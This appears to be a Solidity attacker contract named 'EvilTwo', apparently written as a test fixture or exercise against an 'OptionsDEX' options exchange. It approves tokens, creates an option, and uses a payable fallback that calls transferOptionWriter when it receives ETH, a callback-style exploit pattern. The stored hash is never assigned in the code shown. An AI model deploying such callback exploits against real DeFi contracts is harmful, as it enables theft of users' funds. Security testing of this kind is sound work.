pragma solidity 0.8.0;

import "../interfaces/IERC20.sol";
import "../interfaces/IOptionsDEX.sol";

contract EvilTwo {

    // ERC20 contract
    IERC20 immutable token;
    // OptionsDEX contract
    IOptionsDEX immutable optionsContract;
    // Option hash
    bytes32 private hash;

    constructor(address payable _optionsDEX, address _token) {
        token = IERC20(_token);
        optionsContract = IOptionsDEX(_optionsDEX);
    }

    function setup() public {
        // Give permission for OptionsDEX to use tokens
        token.approve(address(optionsContract), 100*10**18);
        // Create option
        optionsContract.createOption(address(token), 0.1*10**18, 1, 200);
    }

    fallback() external payable {
        optionsContract.transferOptionWriter(hash);
    }

}